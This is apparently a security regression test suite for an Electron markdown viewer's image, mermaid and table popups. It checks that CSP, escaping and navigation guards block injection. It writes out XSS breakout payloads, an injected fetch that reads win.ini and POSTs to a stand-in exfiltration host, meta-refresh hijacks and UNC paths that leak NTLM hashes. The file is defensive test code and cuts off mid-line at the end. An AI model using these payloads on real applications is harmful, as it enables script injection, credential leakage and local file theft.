// Security regression tests for the popup windows opened by the main process.
// Run with: npm run test:popups
//
// The image and mermaid popups are built by string-concatenating
// markdown-derived values into a fresh HTML document which the main process
// then loads. Unlike the viewer's innerHTML sinks, these are parsed as full
// documents, so an injected <script> executes directly - and the windows were
// created with nodeIntegration, making that immediate RCE (SEC-05/06/07).
//
// Payloads set window.__pwned rather than spawning a process. Each attack test
// is paired with a feature test, because escaping these values is exactly the
// kind of change that silently breaks a title, an image or a wireframe.
const { app, BrowserWindow, ipcMain, session } = require("electron");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { startErrorSentinel, captureScreenshot, trapExternalOpens } = require("./test-visual-utils");

// One watcher per popup window, collected as they are opened and drained at the
// end of the run. Keyed by window id so a section that deliberately provokes an
// error can mute the right one. See startErrorSentinel() in test-visual-utils.js.
const popupSentinels = new Map();
const sentinelOf = (popup) => popup && popupSentinels.get(popup.id);

// ---------------------------------------------------------------------------
// Where the exfil / navigation probes point.
//
// These tests deliberately *attempt* outbound POSTs and navigations so they can
// prove CSP and the navigation guards stop them. They used to aim at
// example.com - which is reserved for documentation by RFC 2606, but is a real,
// live host operated by IANA whose own page asks you to "avoid use in
// operations". A test suite firing POSTs at it on every run is operations.
//
// `.invalid` is reserved by RFC 6761 s6.4 and is guaranteed never to resolve,
// so nothing can reach a third party even if every guard in the app failed.
//
// The trap: simply swapping the domain would *weaken* these tests. Assertions
// of the form "the fetch threw" or "the URL is not example.com" would then pass
// because DNS failed, not because CSP blocked anything - a false pass that
// survives deleting the security control entirely. So the domain change is
// paired with the sentinel below, which watches the network layer itself.
// ---------------------------------------------------------------------------
const PROBE_HOST = "mdv-exfil.invalid";

// Every request that reaches Electron's network stack, recorded but NOT
// cancelled. Cancelling here would make the sentinel the thing doing the
// blocking and prove nothing about the app. Because the target cannot resolve,
// recording is safe. An empty list means the request never got past CSP /
// the navigation guard - a strictly stronger claim than "the fetch threw".
const netSentinel = [];

function installNetSentinel() {
  const seen = new Set();
  for (const s of [session.defaultSession]) {
    if (!s || seen.has(s)) continue;
    seen.add(s);
    s.webRequest.onBeforeRequest((details, callback) => {
      if (/^(file|devtools|chrome-extension|blob|data):/i.test(details.url)) {
        return callback({ cancel: false });
      }
      netSentinel.push({ url: details.url, type: details.resourceType });
      callback({ cancel: false });
    });
  }
}

require("./main.js");

const results = [];

function check(name, ok, detail) {
  results.push({ name, ok, detail: ok ? "" : String(detail) });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${ok ? "" : "  -> " + detail}`);
}

// Electron drops buffered stdout when app.exit() is called, so a redirected run
// (`> out.txt`) loses every line. Mirror the results to a file synchronously so
// the run is inspectable regardless of how stdout is captured.
function writeReport(summary) {
  const lines = results.map(
    (r) => `${r.ok ? "PASS" : "FAIL"}  ${r.name}${r.ok ? "" : "  -> " + r.detail}`,
  );
  lines.push(summary);
  try {
    fs.writeFileSync(
      path.join(__dirname, "test-popup-results.txt"),
      lines.join("\n") + "\n",
    );
  } catch (e) {
    console.log("could not write test-popup-results.txt: " + e.message);
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let hostWindow = null;

function mainWindow() {
  return hostWindow || BrowserWindow.getAllWindows()[0];
}

// Drives the real IPC entry point from the renderer, then returns the window
// the main process opened in response.
async function openPopup(channel, payload, settleMs = 1800) {
  const before = new Set(BrowserWindow.getAllWindows().map((w) => w.id));
  await mainWindow().webContents.executeJavaScript(
    `require('electron').ipcRenderer.send(${JSON.stringify(channel)}, ${JSON.stringify(payload)}); true`,
    true,
  );
  let popup = null;
  for (let i = 0; i < 60 && !popup; i++) {
    await sleep(100);
    popup = BrowserWindow.getAllWindows().find((w) => !before.has(w.id)) || null;
  }
  if (!popup) return null;
  // Every popup gets its own watcher: they are separate windows with separate
  // consoles, so a sentinel on the main window sees nothing that happens in
  // them. Started before the load settles so a failure during startup - the
  // most likely moment for one - is not missed.
  popupSentinels.set(
    popup.id,
    startErrorSentinel(popup, {
      label: "popup-" + channel,
      ignore: [
        /net::ERR_NAME_NOT_RESOLVED/,
        /Failed to load resource/i,
        new RegExp(PROBE_HOST.replace(/\./g, "\\.")),
        /example\.invalid/,
      ],
      // These popups are handed images on hosts chosen never to resolve
      // (RFC 6761 .invalid), so a broken image here is the fixture, not a bug.
      ignoreKinds: ["broken-image"],
    }),
  );
  if (popup.webContents.isLoading()) {
    await new Promise((resolve) => {
      popup.webContents.once("did-finish-load", resolve);
      setTimeout(resolve, 8000);
    });
  }
  await sleep(settleMs);
  return popup;
}

async function popupEval(popup, expr) {
  try {
    return await popup.webContents.executeJavaScript(expr, true);
  } catch (e) {
    return { __evalError: String(e && e.message) };
  }
}

async function pwned(popup) {
  const v = await popupEval(popup, "window.__pwned || null");
  return v && v.__evalError ? null : v;
}

function prefsOf(popup) {
  const p = popup.webContents.getLastWebPreferences() || {};
  return {
    nodeIntegration: p.nodeIntegration === true,
    contextIsolation: p.contextIsolation !== false,
  };
}

async function closeAll() {
  // Never close the host window: BrowserWindow.getAllWindows() does not
  // guarantee creation order, so indexing into it destroys the wrong window.
  for (const w of BrowserWindow.getAllWindows()) {
    if (w !== hostWindow && !w.isDestroyed()) w.destroy();
  }
  await sleep(300);
}

async function run() {
  await sleep(2500);
  hostWindow = BrowserWindow.getAllWindows()[0];
  // The host window is the real app, with Node, so it can reach the OS shell -
  // and unlike the other suites this one never starts a sentinel on it, so it
  // gets no backstop install either. Trapped explicitly. See
  // trapExternalOpens() in test-visual-utils.js.
  await trapExternalOpens(hostWindow);
  installNetSentinel();

  // ==========================================================================
  // SEC-05 - image popup interpolates alt into <title> and into an attribute
  // ==========================================================================
  let popup = await openPopup("open-image-popup", {
    src: "x.png",
    alt: "</title><script>window.__pwned='img-title'</script>",
    isDarkMode: false,
  });
  check(
    "SEC-05 image popup opens for a hostile alt",
    popup !== null,
    "no popup window appeared",
  );
  if (popup) {
    check(
      "SEC-05 alt cannot break out of <title> in the image popup",
      (await pwned(popup)) === null,
      "window.__pwned was set from an image alt attribute",
    );
    const prefs = prefsOf(popup);
    check(
      "SEC-08 image popup does not run with Node integration",
      prefs.nodeIntegration === false && prefs.contextIsolation === true,
      JSON.stringify(prefs),
    );
  }
  await closeAll();

  // Second variant: break out of the alt="" attribute on the <img> itself.
  popup = await openPopup("open-image-popup", {
    src: "x.png",
    alt: '" onerror="window.__pwned=\'img-attr\'" data-x="',
    isDarkMode: false,
  });
  if (popup) {
    check(
      "SEC-05 alt cannot break out of the img alt attribute",
      (await pwned(popup)) === null,
      "window.__pwned was set via an alt attribute breakout",
    );
  }
  await closeAll();

  // Feature: an ordinary image still loads, with its alt and title intact.
  popup = await openPopup("open-image-popup", {
    src: "https://example.invalid/a.png",
    alt: 'Plain "quoted" & <angled> caption',
    isDarkMode: false,
  });
  if (popup) {
    const state = await popupEval(
      popup,
      `(() => {
         const img = document.getElementById('the-img');
         return {
           hasImg: !!img,
           src: img ? img.getAttribute('src') : null,
           alt: img ? img.getAttribute('alt') : null,
           title: document.title
         };
       })()`,
    );
    check(
      "FEATURE image popup still renders the image with its src and alt",
      state.hasImg === true &&
        state.src === "https://example.invalid/a.png" &&
        state.alt === 'Plain "quoted" & <angled> caption',
      JSON.stringify(state),
    );
    check(
      "FEATURE image popup title still carries the alt text",
      typeof state.title === "string" && state.title.includes("Plain"),
      JSON.stringify(state),
    );
  }
  await closeAll();

  // ==========================================================================
  // ==========================================================================
  // REMOVAL PIN - the OmniWare wireframe feature was removed from the fork.
  //
  // SEC-06 and its SEC-08/CSP/font legs used to live here. They are replaced
  // rather than deleted: what matters now is that the IPC channel is really
  // gone, not merely unused. main.js registers popup handlers with
  // ipcMain.on, so a leftover registration would still open a Node-hosting
  // BrowserWindow for anything that can reach the renderer's ipcRenderer.
  // An unhandled ipcMain channel is silently ignored, so the observable is
  // that no window appears.
  // ==========================================================================
  popup = await openPopup(
    "open-omniware-popup",
    { dslCode: "@note\n  hello", isDarkMode: false },
    1500,
  );
  check(
    "REMOVED open-omniware-popup no longer opens any window",
    popup === null,
    "a popup window appeared for a channel that should no longer be handled",
  );
  await closeAll();

  // ==========================================================================
  // SEC-07 - mermaid popup interpolates the rendered SVG raw
  // ==========================================================================
  popup = await openPopup(
    "open-mermaid-popup",
    {
      svgContent:
        "<svg xmlns='http://www.w3.org/2000/svg'><text>d</text></svg>" +
        "<scr" + "ipt>window.__pwned='mermaid-popup'</scr" + "ipt>",
      isDarkMode: false,
    },
    2200,
  );
  check(
    "SEC-07 mermaid popup opens for hostile SVG content",
    popup !== null,
    "no popup window appeared",
  );
  if (popup) {
    check(
      "SEC-07 script smuggled in the SVG payload does not execute",
      (await pwned(popup)) === null,
      "window.__pwned was set from mermaid popup SVG content",
    );
    const prefs = prefsOf(popup);
    check(
      "SEC-08 mermaid popup does not run with Node integration",
      prefs.nodeIntegration === false && prefs.contextIsolation === true,
      JSON.stringify(prefs),
    );
  }
  await closeAll();

  // Feature: a genuine mermaid SVG still shows up in the popup.
  popup = await openPopup(
    "open-mermaid-popup",
    {
      svgContent:
        "<svg id='real-diagram' xmlns='http://www.w3.org/2000/svg' width='120' height='60'><text x='5' y='20'>Start</text></svg>",
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    const state = await popupEval(
      popup,
      `(() => {
         const svg = document.querySelector('svg');
         return { hasSvg: !!svg, text: svg ? (svg.textContent || '').trim() : null };
       })()`,
    );
    check(
      "FEATURE mermaid popup still displays the rendered diagram",
      state.hasSvg === true && state.text === "Start",
      JSON.stringify(state),
    );
  }
  await closeAll();

  // ==========================================================================
  // CSP - the popups load from file://, and a file:// document in Electron can
  // read other local files and reach the network. So an injection that manages
  // to execute is local-file theft, not a contained nuisance. The nonce CSP is
  // the control that makes that unreachable; these assert it is actually on
  // each document and actually enforcing.
  // ==========================================================================
  const CSP_CASES = [
    ["mermaid", "open-mermaid-popup", { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false }],
    ["image", "open-image-popup", { src: "img/a.png", alt: "a", isDarkMode: false }],
    ["table", "open-table-popup", { tableData: { data: [{ a: "1" }], columns: [{ title: "A", field: "a" }] }, isDarkMode: false }],
  ];

  for (const [label, channel, payload] of CSP_CASES) {
    popup = await openPopup(channel, payload, 1500);
    if (!popup) {
      check(`CSP ${label} popup opens`, false, "no window appeared");
      continue;
    }
    const csp = await popupEval(
      popup,
      `(() => {
         const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
         return m ? m.getAttribute('content') : null;
       })()`,
    );
    check(
      `CSP ${label} popup declares a nonce policy`,
      typeof csp === "string" && /script-src 'nonce-[^']+'/.test(csp) && /connect-src 'none'/.test(csp),
      String(csp).slice(0, 120),
    );

    // The document's own script must still have RUN. Counting <script nonce>
    // tags is not that test and was found vacuous in review: a tag can be
    // present while its script never executed (refused, thrown, aborted), and a
    // popup broken that way still passes every CSP probe below, because a
    // broken popup refuses injected script just as convincingly as a working
    // one. So each case names an effect that only exists once its own script
    // has run - and the nonce is read back via the IDL property, which is the
    // only way to see it after Chromium's nonce-hiding clears the attribute.
    const alive = await popupEval(
      popup,
      `(() => {
         const tags = [...document.querySelectorAll('script[nonce]')];
         return {
           nonced: tags.length,
           // Nonce hiding: getAttribute('nonce') is emptied once the document
           // is parsed, precisely so injected script cannot read and reuse it.
           nonceReadable: tags.some(t => typeof t.nonce === 'string' && t.nonce.length > 0),
           ran: ${JSON.stringify(label)} === 'mermaid'  ? (typeof window.resetView === 'function' && !!(document.getElementById('viewport') || {}).style.transform)
              : ${JSON.stringify(label)} === 'image'    ? typeof window.resetView === 'function'
              : document.getElementById('data-table').childElementCount > 0,
           body: document.body.innerHTML.length,
         };
       })()`,
    );
    check(
      `CSP ${label} popup's own nonce-carrying script actually ran`,
      alive && alive.nonced > 0 && alive.nonceReadable === true && alive.ran === true,
      JSON.stringify(alive),
    );

    // Inject a script the way an XSS payload would, and confirm the browser
    // refuses to run it because it carries no nonce.
    //
    // Every refusal below is logged to the popup's console, so the watcher has
    // to be muted here or the run fails on its own probes. Muted per popup and
    // only for this block: a CSP refusal anywhere else in this suite is a real
    // finding - that is how a font regression was caught before now.
    await sentinelOf(popup).mute(`CSP ${label} popup: deliberate injection probe`);
    const injected = await popupEval(
      popup,
      `(async () => {
         const s = document.createElement('script');
         s.textContent = 'window.__cspEscape = true;';
         document.body.appendChild(s);
         const img = document.createElement('img');
         img.setAttribute('src', 'does-not-exist-zzz');
         img.setAttribute('onerror', 'window.__cspHandler = true;');
         document.body.appendChild(img);
         await new Promise(r => setTimeout(r, 400));
         let fileRead = 'blocked';
         try {
           const r = await fetch('file:///C:/Windows/win.ini');
           fileRead = 'READ:' + (await r.text()).length;
         } catch (e) {}
         let exfil = 'blocked';
         try { await fetch('https://${PROBE_HOST}/x', { method: 'POST', body: 'y' }); exfil = 'SENT'; } catch (e) {}
         return {
           scriptRan: !!window.__cspEscape,
           handlerRan: !!window.__cspHandler,
           fileRead,
           exfil,
         };
       })()`,
    );
    check(
      `CSP ${label} popup refuses an injected script element`,
      injected && injected.scriptRan === false,
      JSON.stringify(injected),
    );
    check(
      `CSP ${label} popup refuses an injected inline event handler`,
      injected && injected.handlerRan === false,
      JSON.stringify(injected),
    );
    check(
      `CSP ${label} popup cannot read local files or reach the network`,
      injected && injected.fileRead === "blocked" && injected.exfil === "blocked",
      JSON.stringify(injected),
    );
    // Assert the probe really did provoke refusals. Without this, a CSP that
    // stopped being applied would show up here as a quiet, empty mute.
    const probeMute = sentinelOf(popup).currentMute();
    check(
      `CSP ${label} popup's injection probe was actually refused by the policy`,
      !!probeMute &&
        probeMute.suppressed.some((s) =>
          /Content Security Policy|violates the following/i.test(s.detail || ""),
        ),
      JSON.stringify(probeMute),
    );
    await sentinelOf(popup).unmute();
    await closeAll();
  }

  // ==========================================================================
  // Table popup - cells come from the markdown document and were embedded with
  // JSON.stringify, which does not escape `<`, so a cell could close the
  // script element.
  // ==========================================================================
  popup = await openPopup(
    "open-table-popup",
    {
      tableData: {
        data: [{ a: "</script><script>window.__pwned='table'</script>" }],
        columns: [{ title: "A", field: "a" }],
      },
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    check(
      "SEC-06 table popup opens for hostile cell content",
      true,
    );
    // Two independent controls are in play here, so assert both. The CSP alone
    // stops the injected <script> from running - but the cell can still
    // terminate the generated <script> element, which silently destroys the
    // rest of the document. `scriptIntact` is the part that only toJsonLiteral
    // can satisfy: with a plain JSON.stringify the payload closes the script
    // and Tabulator never initialises.
    const structure = await popupEval(
      popup,
      `(() => {
         const scripts = [...document.querySelectorAll('script')];
         return {
           injectedScripts: scripts.filter((s) => !s.nonce && !s.src).length,
           tabulatorLoaded: typeof window.Tabulator !== 'undefined',
         };
       })()`,
    );
    check(
      "SEC-06 table cell cannot terminate the popup's script element",
      (await pwned(popup)) === null &&
        structure &&
        structure.injectedScripts === 0 &&
        structure.tabulatorLoaded === true,
      JSON.stringify(structure),
    );
    const table = await popupEval(
      popup,
      `(() => {
         const rows = document.querySelectorAll('.tabulator-row').length;
         const text = document.body.innerText || '';
         return { rows, hasTable: !!window.Tabulator, showsPayload: text.includes('script') };
       })()`,
    );
    check(
      "FEATURE table popup still builds the table from the data",
      table && table.hasTable === true && table.rows > 0,
      JSON.stringify(table),
    );
  } else {
    check("SEC-06 table popup opens for hostile cell content", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // Remote share paths in the image popup. On Windows an <img> pointing at a
  // UNC path makes Chromium perform an SMB fetch with no user interaction,
  // leaking the current user's NTLM hash to a host the author chose.
  // ==========================================================================
  const SHARE_CASES = [
    ["UNC backslash", "\\\\attacker\\share\\x.png"],
    ["protocol-relative", "//attacker/share/x.png"],
    ["file:// with host", "file://attacker/share/x.png"],
    ["file://// with host", "file:////attacker/share/x.png"],
    ["extended UNC", "\\\\?\\UNC\\attacker\\share\\x.png"],
  ];
  for (const [label, src] of SHARE_CASES) {
    popup = await openPopup("open-image-popup", { src, alt: "x", isDarkMode: false }, 1200);
    if (!popup) {
      check(`SEC-04 image popup drops ${label}`, false, "no window");
      continue;
    }
    const got = await popupEval(
      popup,
      `(() => { const i = document.getElementById('the-img'); return i ? i.getAttribute('src') : null; })()`,
    );
    check(`SEC-04 image popup drops ${label}`, got === "", JSON.stringify(got));
    await closeAll();
  }

  // The same helper must not throw away legitimate local sources.
  const KEEP_CASES = [
    ["drive path", "C:\\pics\\a.png"],
    ["file url", "file:///C:/pics/b.png"],
    ["relative path", "img/c.png"],
    ["https url", "https://example.invalid/d.png"],
  ];
  for (const [label, src] of KEEP_CASES) {
    popup = await openPopup("open-image-popup", { src, alt: "x", isDarkMode: false }, 1200);
    if (!popup) {
      check(`FEATURE image popup keeps ${label}`, false, "no window");
      continue;
    }
    const got = await popupEval(
      popup,
      `(() => { const i = document.getElementById('the-img'); return i ? i.getAttribute('src') : null; })()`,
    );
    check(`FEATURE image popup keeps ${label}`, got === src, JSON.stringify(got));
    await closeAll();
  }

  // ==========================================================================
  // Bridge scoping - each popup should get only the API it needs, so script in
  // one popup cannot drive another popup's privileged path.
  // ==========================================================================
  const BRIDGE_CASES = [
    ["mermaid", "open-mermaid-popup", { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false }, ["exportMermaidPdf"]],
    ["image", "open-image-popup", { src: "img/a.png", alt: "a", isDarkMode: false }, ["saveImage"]],
  ];
  for (const [label, channel, payload, expected] of BRIDGE_CASES) {
    popup = await openPopup(channel, payload, 1200);
    if (!popup) {
      check(`SEC-08 ${label} popup exposes only its own bridge API`, false, "no window");
      continue;
    }
    const keys = await popupEval(
      popup,
      `window.popupBridge ? Object.keys(window.popupBridge).sort() : null`,
    );
    check(
      `SEC-08 ${label} popup exposes only its own bridge API`,
      Array.isArray(keys) && keys.join(",") === expected.sort().join(","),
      JSON.stringify(keys),
    );
    await closeAll();
  }

  // ==========================================================================
  // Save-image payload validation. Only the rejection paths are exercised:
  // a valid payload opens a native save dialog, which would block the harness
  // forever.
  // ==========================================================================
  popup = await openPopup("open-image-popup", { src: "img/a.png", alt: "a", isDarkMode: false }, 1200);
  if (popup) {
    const bad = await popupEval(
      popup,
      `new Promise((resolve) => {
         window.popupBridge.saveImage('data:text/html;base64,PHNjcmlwdD4=', 'png', resolve);
         setTimeout(() => resolve({ timedOut: true }), 4000);
       })`,
    );
    check(
      "SEC-05 image save refuses a non-image data URL",
      bad && bad.success === false && !bad.timedOut,
      JSON.stringify(bad),
    );

    const notDataUrl = await popupEval(
      popup,
      `new Promise((resolve) => {
         window.popupBridge.saveImage('file:///C:/Windows/win.ini', 'png', resolve);
         setTimeout(() => resolve({ timedOut: true }), 4000);
       })`,
    );
    check(
      "SEC-05 image save refuses a non-data-URL payload",
      notDataUrl && notDataUrl.success === false && !notDataUrl.timedOut,
      JSON.stringify(notDataUrl),
    );
  } else {
    check("SEC-05 image save refuses a non-image data URL", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // Entity-encoded scheme in SVG. The javascript: strip used to run before the
  // parser decodes character references, so `javascript&#58;` survived it.
  // ==========================================================================
  const ENTITY_CASES = [
    ["numeric decimal", "javascript&#58;window.__pwned=1"],
    ["numeric hex", "javascript&#x3a;window.__pwned=1"],
    ["named colon entity", "javascript&colon;window.__pwned=1"],
  ];

  for (const [label, hostileHref] of ENTITY_CASES) {
    popup = await openPopup(
      "open-mermaid-popup",
      {
        svgContent:
          "<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='80' height='40'>" +
          `<a id='evil' xlink:href='${hostileHref}'><rect width='80' height='40'/></a></svg>`,
        isDarkMode: false,
      },
      1600,
    );
    if (popup) {
      const href = await popupEval(
        popup,
        `(() => {
           const a = document.getElementById('evil');
           if (!a) return null;
           return a.getAttribute('xlink:href') || a.getAttribute('href') || '';
         })()`,
      );
      check(
        `SEC-07 ${label} javascript scheme is stripped from SVG`,
        typeof href === "string" && !/javascript\s*:/i.test(href),
        JSON.stringify(href),
      );
    } else {
      check(`SEC-07 ${label} javascript scheme is stripped from SVG`, false, "no window");
    }
    await closeAll();
  }

  // ==========================================================================
  // SEC-11 (popups) - navigation. The CSP governs what a document may execute
  // and connect to; it says nothing about the document being replaced. Hostile
  // SVG can carry `<meta http-equiv="refresh">`, directly or inside a
  // <foreignObject>, and navigate the popup to an attacker page. That page is
  // then a normal remote origin - but it inherits the popup's preload, so the
  // popupBridge survives the navigation. Assert the popup cannot leave its own
  // temp file:// document.
  // ==========================================================================
  const NAV_PAYLOADS = [
    [
      "meta refresh",
      "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'></svg>" +
        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/meta-probe\">",
    ],
    [
      "meta refresh inside foreignObject",
      "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'><foreignObject width='40' height='40'>" +
        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/foreign-probe\">" +
        "</foreignObject></svg>",
    ],
  ];

  for (const [label, svgContent] of NAV_PAYLOADS) {
    popup = await openPopup("open-mermaid-popup", { svgContent, isDarkMode: false }, 1500);
    if (!popup) {
      check(`SEC-11 mermaid popup survives ${label}`, false, "no window");
      continue;
    }
    // Give any refresh the time it needs to actually fire before sampling.
    await new Promise((r) => setTimeout(r, 2500));
    const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
    check(
      `SEC-11 mermaid popup cannot be navigated away by ${label}`,
      url.startsWith("file:///") && !url.includes(PROBE_HOST),
      url.slice(0, 140),
    );
    await closeAll();
  }

  // Same class, driven from script rather than markup: even if something did
  // execute, the window must not be able to relocate itself.
  popup = await openPopup(
    "open-mermaid-popup",
    { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false },
    1500,
  );
  if (popup) {
    await popupEval(popup, `(() => { try { location.href = 'https://${PROBE_HOST}/js-probe'; } catch (e) {} return 1; })()`);
    await new Promise((r) => setTimeout(r, 2000));
    const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
    check(
      "SEC-11 mermaid popup cannot be navigated away by location assignment",
      url.startsWith("file:///") && !url.includes(PROBE_HOST),
      url.slice(0, 140),
    );
    // window.open must not spawn a second, unguarded window either.
    const before = BrowserWindow.getAllWindows().length;
    await popupEval(popup, `(() => { try { window.open('https://${PROBE_HOST}/open-probe'); } catch (e) {} return 1; })()`);
    await new Promise((r) => setTimeout(r, 1200));
    check(
      "SEC-11 mermaid popup cannot open a new window",
      BrowserWindow.getAllWindows().length === before,
      `${before} -> ${BrowserWindow.getAllWindows().length}`,
    );
  } else {
    check("SEC-11 mermaid popup cannot be navigated away by location assignment", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // FEATURE regression for the two controls added above. The table popup's CSV
  // and JSON export builds a Blob and clicks an <a download>. Both the CSP
  // (`default-src 'none'` plus a blob: allowance) and the navigation guards
  // could plausibly kill that, and it would fail silently in normal use. Assert
  // a download actually starts.
  // ==========================================================================
  popup = await openPopup(
    "open-table-popup",
    {
      tableData: {
        data: [{ a: "1", b: "x" }],
        columns: [
          { title: "A", field: "a" },
          { title: "B", field: "b" },
        ],
      },
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    const started = [];
    const onWillDownload = (_e, item) => {
      started.push(item.getFilename());
      item.cancel();
    };
    popup.webContents.session.on("will-download", onWillDownload);

    await popupEval(popup, `(() => { exportCSV(); return 1; })()`);
    await new Promise((r) => setTimeout(r, 1500));
    check(
      "FEATURE table popup CSV export still starts a download under CSP",
      started.some((n) => /\.csv$/i.test(n)),
      JSON.stringify(started),
    );

    await popupEval(popup, `(() => { exportJSON(); return 1; })()`);
    await new Promise((r) => setTimeout(r, 1500));
    check(
      "FEATURE table popup JSON export still starts a download under CSP",
      started.some((n) => /\.json$/i.test(n)),
      JSON.stringify(started),
    );

    popup.webContents.session.removeListener("will-download", onWillDownload);
  } else {
    check("FEATURE table popup CSV export still starts a download under CSP", false, "no window");
  }
  await closeAll();

  // ---------------------------------------------------------------------
  // Theme carried by the REAL renderer -> popup path.
  //
  // Every other case in this file calls openPopup(), which sends the IPC
  // message straight to main.js with isDarkMode hardcoded false. That is the
  // right call for CSP and injection testing, but it means the flag the app
  // actually computes is never exercised - the suite would stay green if the
  // renderer stopped sending the theme entirely, and every popup would open
  // white against a dark app.
  //
  // That is not hypothetical. The mermaid theme bug fixed earlier in this fork
  // was exactly this shape: a theme value that was correct wherever the tests
  // looked and wrong on the path a user takes. So this section clicks the real
  // buttons in a real rendered document, in both themes, and asserts the popup
  // came up in the matching one.
  const themeDoc = "# T\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n```mermaid\ngraph LR\n  PopA --> PopB\n```\n";
  for (const wantDark of [true, false]) {
    const label = wantDark ? "dark" : "light";
    const appState = await mainWindow().webContents.executeJavaScript(
      `(async () => {
        if (document.body.classList.contains('dark-mode') !== ${wantDark}) {
          document.getElementById('darkModeToggle').click();
        }
        await renderMarkdown(${JSON.stringify(themeDoc)}, 'full');
        return JSON.stringify({
          dark: document.body.classList.contains('dark-mode'),
          table: document.querySelectorAll('.table-maximize-btn').length,
          mermaid: document.querySelectorAll('.mermaid-maximize-btn').length
        });
      })()`,
      true,
    );
    await sleep(2500);
    const parsed = JSON.parse(appState);
    check(
      `FEATURE the app really is in ${label} mode with both maximize buttons rendered`,
      parsed.dark === wantDark && parsed.table === 1 && parsed.mermaid === 1,
      appState,
    );

    for (const [what, selector] of [
      ["table", ".table-maximize-btn"],
      ["mermaid", ".mermaid-maximize-btn"],
    ]) {
      const before = new Set(BrowserWindow.getAllWindows().map((w) => w.id));
      await mainWindow().webContents.executeJavaScript(
        `document.querySelector(${JSON.stringify(selector)}).click(); true`,
        true,
      );
      let popup = null;
      for (let i = 0; i < 60 && !popup; i++) {
        await sleep(100);
        popup = BrowserWindow.getAllWindows().find((w) => !before.has(w.id)) || null;
      }
      if (!popup) {
        check(`FEATURE ${what} popup opens from a real click in ${label} mode`, false, "no window");
        continue;
      }
      if (popup.webContents.isLoading()) {
        await new Promise((resolve) => {
          popup.webContents.once("did-finish-load", resolve);
          setTimeout(resolve, 8000);
        });
      }
      await sleep(600);
      // Asserted as a luminance band rather than an exact hex so that a palette
      // tweak does not fail the suite; what must never happen is a light popup
      // over a dark app.
      const bg = await popupEval(
        popup,
        `(() => {
          const c = getComputedStyle(document.body).backgroundColor;
          const m = c.match(/\\d+/g) || [255, 255, 255];
          const lum = (0.299 * +m[0] + 0.587 * +m[1] + 0.114 * +m[2]) / 255;
          return JSON.stringify({ c, lum });
        })()`,
      );
      const lum = bg && !bg.__evalError ? JSON.parse(bg).lum : null;
      check(
        `FEATURE ${what} popup opened from a real click follows the app's ${label} theme`,
        lum !== null && (wantDark ? lum < 0.3 : lum > 0.7),
        `${bg} (window bg ${popup.getBackgroundColor && popup.getBackgroundColor()})`,
      );
      await closeAll();
    }
  }

  // ==========================================================================
  // SEC-11/12 - the network sentinel.
  //
  // Everything above asserted on symptoms observable from inside the page: the
  // fetch threw, the URL did not change. Those are all satisfiable by a request
  // that leaves the process and merely fails. This asserts the opposite and
  // much stronger property - that nothing ever reached Electron's network stack
  // at all, so CSP and the navigation guard stopped it before egress.
  //
  // Non-vacuous by construction: the probes above genuinely attempt a POST, a
  // meta refresh, a location assignment and a window.open. Remove the CSP or
  // the will-navigate guard and entries appear here.
  // ==========================================================================
  const escaped = netSentinel.filter((r) => r.url.includes(PROBE_HOST));
  check(
    "SEC-11/12 no exfil or navigation probe ever reached the network stack",
    escaped.length === 0,
    JSON.stringify(escaped.slice(0, 5)),
  );
  // The popups legitimately render remote <img> referenced by the document, so
  // "zero requests" is the wrong invariant - it would fail on a working
  // feature. The right one is that image loading is the *only* egress the
  // popup can perform: no XHR/fetch, no script, no stylesheet, no subframe,
  // no navigation. Anything else appearing here is a new covert channel.
  //
  // Worth recording as a product observation rather than a test failure:
  // maximizing an image from a hostile document does contact its host, which
  // leaks the reader's IP. That is inherited from the main viewer's behaviour
  // and is a policy decision, not a regression - see docs/SECURITY-AUDIT.md.
  const nonImage = netSentinel.filter((r) => r.type !== "image");
  check(
    "SEC-12 popups can only ever emit image loads, never any other request type",
    nonImage.length === 0,
    JSON.stringify(nonImage.slice(0, 5)),
  );

  // ==========================================================================
  // SEC-20 — the generated popup document must live in a private, unguessable
  // temp directory, not at a fixed path in the shared one.
  //
  // The old paths were `os.tmpdir()/omnicore-temp-<kind>.html`. On Linux and
  // macOS that directory is world-writable, so a local process can pre-create
  // the exact path as a symlink and `fs.writeFileSync` follows it - opening a
  // popup becomes an arbitrary file write as the user.
  //
  // Driven through the real IPC entry point, so what is measured is where the
  // document the popup actually loaded came from.
  // ==========================================================================
  const tmpRoot = os.tmpdir();
  const mermaidA = await openPopup("open-mermaid-popup", {
    svg: "<svg xmlns='http://www.w3.org/2000/svg'><text>A</text></svg>",
    isDarkMode: true,
  });
  const mermaidB = await openPopup("open-mermaid-popup", {
    svg: "<svg xmlns='http://www.w3.org/2000/svg'><text>B</text></svg>",
    isDarkMode: true,
  });
  const pathOf = (p) => {
    if (!p) return null;
    try {
      return decodeURIComponent(new URL(p.webContents.getURL()).pathname).replace(/^\//, "");
    } catch (e) {
      return null;
    }
  };
  // A file:// URL yields forward slashes while os.tmpdir() yields backslashes
  // on Windows, so the two are normalised before being compared. Without this
  // the directory clause below silently compares unequal strings and passes no
  // matter where the document lives - a vacuous assertion of exactly the kind
  // this suite exists to avoid.
  const sameDir = (a, b) =>
    !!a && !!b && path.resolve(a).toLowerCase() === path.resolve(b).toLowerCase();
  const pathA = pathOf(mermaidA);
  const pathB = pathOf(mermaidB);
  check(
